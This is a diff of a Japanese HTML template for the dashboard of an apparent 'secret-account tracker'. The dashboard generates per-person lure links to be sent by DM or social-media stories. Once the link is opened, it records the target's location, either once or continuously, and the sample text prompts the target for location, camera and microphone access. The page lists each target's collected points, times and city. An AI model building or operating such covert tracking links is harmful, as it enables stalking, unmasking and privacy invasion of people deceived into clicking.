@@ -1,52 +1,145 @@
-{% extends "base.html" %}{% block content %}
-<h1>追跡（人物ごと）</h1>
-<p class="dim">人物ごとにURLを1本作り、DMやストーリーで踏ませます。
-「一瞬」は開いた瞬間の1点だけ、「リアルタイム」は開いている間ずっと記録します。
-作ったURLはいつでもここから開けます。</p>
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>追跡リンク一覧</title>
+<style>
+body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif}
+.wrap{max-width:940px;margin:0 auto;padding:16px}
+h1{font-size:18px;margin:0 0 4px}
+h3{font-size:13px;margin:20px 0 6px;color:#c7cddb}
+.sub{color:#8b93a7;font-size:11.5px;margin:0 0 14px}
+.nav{display:flex;flex-wrap:wrap;gap:7px;margin:0 0 14px}
+.nav a{display:inline-block;padding:7px 13px;border-radius:8px;background:#2b3346;
+  color:#c7cddb;text-decoration:none;font-size:12px}
+.nav a.back{background:#3a2b46;color:#e0c7ff}
+.box{background:#171a21;border:1px solid #232734;border-radius:12px;padding:14px;margin-bottom:14px}
+label{display:block;font-size:12px;color:#c7cddb;margin:10px 0 4px}
+input[type=text],select,textarea{width:100%;box-sizing:border-box;background:#0f1115;
+  border:1px solid #2b3346;border-radius:8px;color:#e6e9ef;padding:8px 10px;font-size:13px}
+textarea{min-height:90px;resize:vertical;line-height:1.7}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+button{padding:9px 18px;border:0;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  font-size:12.5px;cursor:pointer;font-family:inherit}
+button.p{background:#4c8dff;color:#fff}
+button.d{background:#3a1b1b;color:#ff9b9b}
+button.sm{padding:5px 10px;font-size:11.5px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th,td{border-bottom:1px solid #232734;padding:7px 5px;text-align:left;vertical-align:middle}
+th{color:#8b93a7;font-weight:500;white-space:nowrap}
+a{color:#4c8dff}
+.badge{display:inline-block;font-size:10.5px;padding:2px 7px;border-radius:5px;
+  background:#232734;color:#8b93a7;margin-left:5px}
+.badge.on{background:#12301c;color:#7ee08a}
+.flex{display:flex;gap:6px;flex-wrap:wrap}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#8b93a7}
+.gname{font-size:12px;color:#7ee08a;margin:16px 0 4px}
+</style></head><body><div class="wrap">
+<h1>追跡リンク</h1>
+<p class="sub">名前とメモが、リンクを開いた人に見える「要件」になります。</p>
+<div class="nav">
+  <a class="back" href="/">裏垢トラッカー</a>
+  <a href="/livetrack">表示設定</a>
+  <a href="/links">通常リンク</a>
+</div>
 
-<p><a href="/livetrack"><button type="button">表示・文言の設定</button></a></p>
+<div class="box">
+  <strong style="font-size:13px">新規作成</strong>
+  <form method="post" action="/tracks/add">
+    <label>名前（要件の見出し・相手に見えます）</label>
+    <input type="text" name="person" placeholder="例: 田中さん" required>
+    <label>メモ（要件本文・相手に見えます。改行OK）</label>
+    <textarea name="note" placeholder="例: 下の「続ける」を押すと、位置情報・カメラ・マイクの順に許可を聞きます。"></textarea>
+    <div class="row2">
+      <div>
+        <label>モード</label>
+        <select name="mode">
+          <option value="live" selected>live（連続追跡）</option>
+          <option value="snap">snap（1回だけ測位）</option>
+          <option value="page">page（ランディング）</option>
+          <option value="quiz">quiz（クイズ）</option>
+          <option value="identify">identify（自己申告）</option>
+          <option value="redirect">redirect（即転送）</option>
+        </select>
+      </div>
+      <div>
+        <label>取得間隔（秒）</label>
+        <input type="text" name="interval" value="15">
+      </div>
+    </div>
+    <label>飛び先URL（空なら移動しません）</label>
+    <input type="text" name="dest" placeholder="https://example.com/">
+    <div class="flex" style="margin-top:12px">
+      <button class="p" type="submit">作成して追跡画面へ</button>
+    </div>
+  </form>
+</div>
 
-<form method="post" action="/tracks/add" class="card">
-  <label>人物名 <input name="person" placeholder="例: Aさん / 裏垢のあの人" required></label>
-  <label>種類
-    <select name="mode">
-      <option value="snap">一瞬のタイプ（開いた瞬間の1点だけ）</option>
-      <option value="live">リアルタイム追跡（開いている間ずっと）</option>
-    </select></label>
-  <label>送信間隔（秒・リアルタイムのみ） <input name="interval" type="number" value="15" min="5" max="600"></label>
-  <label>飛び先URL（任意） <input name="dest" placeholder="https://www.instagram.com/xxxx/"></label>
-  <label>メモ <input name="note"></label>
-  <button>この人物の追跡URLを作る</button>
-</form>
-
-<h2>登録済み {{ rows|length }} 件</h2>
-{% for person, items in groups.items() %}
-<div class="card">
-  <h3>{{ person }}</h3>
-  <table>
-  <tr><th>種類</th><th>状態</th><th>最新位置</th><th>点数</th><th>URL</th><th></th></tr>
-  {% for l in items %}
+{% for gname, items in groups.items() %}
+<div class="gname">{{ gname }}（{{ items|length }}）</div>
+<table>
+  <tr><th>名前</th><th>状態</th><th>取得点</th><th>最終</th><th>操作</th></tr>
+  {% for r in items %}
   <tr>
-    <td>{% if l.mode == "live" %}<span class="badge">リアルタイム</span>{% else %}一瞬{% endif %}</td>
-    <td>{% if l.live %}<span class="badge">ライブ中</span>
-        {% elif l.last_ts %}{{ l.last_ts[:19] }}<br><small>最終更新</small>
-        {% else %}未使用{% endif %}</td>
-    <td>{% if l.last_lat %}<span class="mono">{{ l.last_lat|round(5) }}, {{ l.last_lon|round(5) }}</span>
-        <br><small>{{ l.last_city or "" }} {{ l.last_src or "" }}</small>
-        {% else %}-{% endif %}</td>
-    <td>{{ l.pts }}</td>
-    <td class="mono">{{ base }}/l/{{ l.code }}</td>
     <td>
-      <a href="/track/{{ l.code }}"><button type="button">開く</button></a>
-      <a href="/link/{{ l.code }}/qr.png" target="_blank" rel="noopener"><button type="button">QR</button></a>
-      <form method="post" action="/track/{{ l.code }}/delete" style="display:inline">
-        <button>削除</button></form>
+      <a href="/track/{{ r.code }}">{{ r.name }}</a>
+      <div class="mono">{{ r.code }}</div>
+    </td>
+    <td>
+      <span class="badge">{{ r.mode }}</span>
+      {% if r.live %}<span class="badge on">LIVE</span>{% endif %}
+      {% if not r.active %}<span class="badge">停止中</span>{% endif %}
+      {% if r.last_src %}<span class="badge">{{ r.last_src }}</span>{% endif %}
+    </td>
+    <td>{{ r.pts }}</td>
+    <td class="mono">{{ (r.last_ts or '')[:16] }}<br>{{ r.last_city or '' }}</td>
+    <td>
+      <div class="flex">
+        <button class="sm cp" data-url="/l/{{ r.code }}">コピー</button>
+        <a class="sm" href="/l/{{ r.code }}" target="_blank"
+           style="padding:5px 10px;font-size:11.5px;border-radius:8px;background:#2b3346;
+                  color:#c7cddb;text-decoration:none">開く</a>
+        <a class="sm" href="/track/{{ r.code }}"
+           style="padding:5px 10px;font-size:11.5px;border-radius:8px;background:#2b3346;
+                  color:#c7cddb;text-decoration:none">監視室</a>
+        <form method="post" action="/track/{{ r.code }}/delete"
+              onsubmit="return confirm('削除しますか？')">
+          <button class="sm d" type="submit">削除</button></form>
+      </div>
     </td>
   </tr>
   {% endfor %}
-  </table>
-</div>
+</table>
 {% else %}
-<p class="dim">まだありません。上のフォームから人物を登録してください。</p>
+<p class="sub">まだリンクがありません。上のフォームから作成してください。</p>
 {% endfor %}
-{% endblock %}
+
+<script>
+(function () {
+  function copy(text, btn) {
+    function done() {
+      var old = btn.textContent;
+      btn.textContent = "コピー済";
+      setTimeout(function () { btn.textContent = old; }, 1400);
+    }
+    function fallback() {
+      try {
+        var t = document.createElement("textarea");
+        t.value = text; t.style.cssText = "position:fixed;left:-9999px";
+        document.body.appendChild(t); t.select(); document.execCommand("copy");
+        t.remove(); done();
+      } catch (e) {}
+    }
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done).catch(fallback);
+      } else fallback();
+    } catch (e) { fallback(); }
+  }
+  Array.prototype.forEach.call(document.querySelectorAll("button.cp"), function (b) {
+    b.addEventListener("click", function () {
+      copy(location.origin + b.getAttribute("data-url"), b);
+    });
+  });
+})();
+</script>
+</div></body></html>
